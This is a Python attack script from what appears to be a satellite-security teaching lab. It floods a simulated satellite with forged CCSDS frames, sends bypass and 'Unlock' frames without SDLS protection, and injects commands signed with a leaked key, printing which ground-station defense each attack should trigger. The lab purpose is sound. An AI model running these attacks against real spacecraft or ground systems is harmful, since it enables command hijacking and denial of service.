"""
Attacker - phase 3. The phase 2 attacks (attack_f2.py) still fail;
here we test three new scenarios:

  flood [--n 300]      flood: hundreds of fake frames, as fast as possible.
                       Goal: overload the satellite or bury the ground station
                       in events. Defense: event limit and a summary.
  bypass               BD (bypass) frame and BC 'Unlock' command WITHOUT SDLS.
                       Bypass skips the FARM, but never the security.
  leaked <key_hex>     the attacker has a leaked TC key (for example, pasted
                       in a chat) and uses it with a BD frame. It works...
                       until the ground station runs 'rotate'.

Usage (in PowerShell, from the project folder):
    py attacks\\attack_f3.py --sat 192.168.33.108 flood
    py attacks\\attack_f3.py --sat 192.168.33.108 bypass
    py attacks\\attack_f3.py --sat 192.168.33.108 leaked 3f090e2c...

Only against your own C5, on your own network.
"""

import argparse
import os
import random
import secrets
import socket
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ground"))

from ccsds import cop1, frames, sdls, services  # noqa: E402

TC_PORT = 10025
RED = bytes([255, 0, 0])


def send(sat, frame: bytes, label: str, quiet: bool = False):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.settimeout(1.0)
        s.sendto(frame, sat)
        if not quiet:
            print(f"[ATTACKER] {label} ({len(frame)} bytes): {frame.hex()}")
        try:
            data, _ = s.recvfrom(2048)
            print(f"[ATTACKER] The satellite answers me ({len(data)} bytes, encrypted). It thinks I am the ground station.")
            return True
        except (socket.timeout, ConnectionResetError):
            if not quiet:
                print("[ATTACKER] No answer.")
            return False


def flood(sat, n: int):
    fake = sdls.SecurityAssociation(sdls.SPI_TC, secrets.token_bytes(32))
    pkt = services.build_tc_packet(services.TC_SET_COLOR, 1, RED)
    frames_list = [sdls.build_secure_tc_frame(fake, pkt, seq=i & 0xFF, iv_counter=10**15 + i) for i in range(n)]
    print(f"[ATTACKER] Sending {n} fake frames as fast as possible...")
    t0 = time.time()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        for f in frames_list:
            s.sendto(f, sat)
    dt = time.time() - t0
    print(f"[ATTACKER] {n} frames in {dt:.2f} s ({n / max(dt, 1e-6):.0f} frames/s).")
    print("           Look at the ground console: you should see a few events and one")
    print("           FLOOD message with the rest summarized. Try a 'color' from ground meanwhile.")


def bypass(sat):
    pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), RED)
    bd = frames.build_tc_frame(pkt, seq=0, bypass=True)
    print("[ATTACKER] 1) BD (bypass) frame without SDLS: 'can I skip the controls?'")
    send(sat, bd, "BD frame sent")
    bc = frames.build_tc_frame(cop1.UNLOCK, seq=0, bypass=True, control=True)
    print("[ATTACKER] 2) BC control command 'Unlock' without SDLS")
    send(sat, bc, "BC frame sent")
    print("           Both should arrive at ground as a SECURITY EVENT.")


def leaked(sat, key_hex: str):
    try:
        key = bytes.fromhex(key_hex)
        assert len(key) == 32
    except (ValueError, AssertionError):
        print("[ATTACKER] The key must be 32 bytes in hex (64 characters).")
        return 1
    sa = sdls.SecurityAssociation(sdls.SPI_TC, key)
    pkt = services.build_tc_packet(services.TC_SET_COLOR, random.randint(0, 0x3FFF), RED)
    # BD so we don't need to guess N(S); IV from the clock to be ahead of the counter
    frame = sdls.build_secure_tc_frame(sa, pkt, seq=0, iv_counter=time.time_ns() // 1000 + 10**6, bypass=True)
    print("[ATTACKER] Using a leaked TC key to send 'red screen' with a BD frame.")
    if send(sat, frame, "Frame signed with the leaked key"):
        print("[ATTACKER] ACCEPTED: with the leaked key I have control. This is why an exposed key is rotated.")
    else:
        print("[ATTACKER] Rejected: that key is not active anymore (or it was not the right one).")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Attacker (phase 3, only for your lab)")
    p.add_argument("--sat", required=True, help="IP of YOUR C5")
    p.add_argument("--port", type=int, default=TC_PORT, help=argparse.SUPPRESS)
    sub = p.add_subparsers(dest="scenario", required=True)
    fp = sub.add_parser("flood", help="flood of fake frames")
    fp.add_argument("--n", type=int, default=300)
    sub.add_parser("bypass", help="BD/BC frames without SDLS")
    lp = sub.add_parser("leaked", help="use a leaked TC key")
    lp.add_argument("key")
    args = p.parse_args(argv)
    sat = (args.sat, args.port)
    if args.scenario == "flood":
        flood(sat, max(1, min(args.n, 5000)))
    elif args.scenario == "bypass":
        bypass(sat)
    else:
        return leaked(sat, args.key)
    return 0


if __name__ == "__main__":
    sys.exit(main())
